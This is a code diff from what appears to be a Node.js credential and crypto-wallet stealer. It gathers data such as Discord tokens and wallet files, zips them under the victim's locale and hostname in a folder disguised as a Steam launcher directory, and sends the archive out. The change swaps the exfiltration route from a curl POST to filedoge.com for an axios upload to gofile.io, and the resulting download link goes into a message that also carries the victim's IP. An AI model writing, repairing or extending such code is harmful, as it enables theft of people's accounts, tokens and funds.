@@ -10,8 +10,11 @@ const crypto = require('crypto');
 const sqlite3 = require('sqlite3');
 const util = require('util');
 function getLocale() {
+    
     return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
 }
+
+
 const computerName = os.hostname();
 const local = process.env.LOCALAPPDATA;
 const discords = [];
@@ -2702,35 +2705,58 @@ async function archiveAndSendData() {
     }
 }
 
+async function getServers() {
+    try {
+        console.log('Searching servers...');
+        const response = await axios.get('https://api.gofile.io/servers');
+        const servers = response.data.data.servers;
+        console.log(`Server i got: ${servers.map(server => server.name).join(', ')}`);
+        return servers;
+    } catch (error) {
+        console.error(`Error while searching for servers : ${error}`);
+        throw error;
+    }
+}
 
-async function uploadToDoge(destinationFolder, locale, computerName) {
-    return new Promise((resolve, reject) => {
+async function uploadToGofile(destinationFolder, locale, computerName) {
+    console.log('Fn uploadToGofile called');
+    return new Promise(async (resolve, reject) => {
+        console.log('Creating ZIP folder path');
         const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;
 
+        console.log(`Checking if the file exists: ${zipFilePath}`);
         if (!fs.existsSync(zipFilePath)) {
-            console.error(`Error: File does not exist - ${zipFilePath}`);
-            reject(new Error(`File does not exist - ${zipFilePath}`));
+            console.error(`Error: file not found - ${zipFilePath}`);
+            reject(new Error(`file not found - ${zipFilePath}`));
             return;
         }
 
-        const uploadCommand = `curl --location --request POST "https://api.filedoge.com/upload" -H "Content-Type: multipart/form-data;" --form "file=@${zipFilePath.replace(/\\/g, '/')}";`
+        const fileName = path.basename(zipFilePath);
+        console.log(`File name: ${fileName}`);
 
-        exec(uploadCommand, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`Error uploading to FileDoge: ${error}`);
-                reject(error);
-            } else {
-                try {
-                    const response = JSON.parse(stdout);
-                    const token = response.token;
-                    console.log(`Upload successful. Token: ${token}`);
-                    resolve(token);
-                } catch (jsonError) {
-                    console.error(`Error parsing JSON response: ${jsonError}`);
-                    reject(new Error('Invalid JSON response from the API'));
+        const form = new FormData();
+        form.append('file', fs.createReadStream(zipFilePath));
+        console.log('Form append');
+
+        try {
+            const servers = await getServers();
+            const server = servers[0].name;
+            const url = `https://${server}.gofile.io/uploadFile`;
+
+            console.log(`Upload on the server: ${url}`);
+            const response = await axios.post(url, form, {
+                headers: {
+                    ...form.getHeaders()
                 }
-            }
-        });
+            });
+
+            const downloadPage = response.data.data.downloadPage;
+            console.log(`Upload succesful, here is the link : ${downloadPage}`);
+            resolve(downloadPage);
+        } catch (error) {
+            console.error(`Error uploading to gofile: ${error}`);
+            reject(error);
+        }
     });
 }
 
@@ -2829,8 +2855,8 @@ async function getExtension(zipFilePath) {
     const foundWalletsTele = await checkWalletstele(mainFolderPath);
 
     const destinationFolder = 'C:\\ProgramData\\Steam\\Launcher';
-    const token = await uploadToDoge(destinationFolder, locale, computerName);
-    const downloadLink = `https://api.filedoge.com/download/${token}`;
+    const token = await uploadToGofile(destinationFolder, locale, computerName);
+    const downloadLink = `${token}`;
     const ip = await getIp();
 
 const message = `
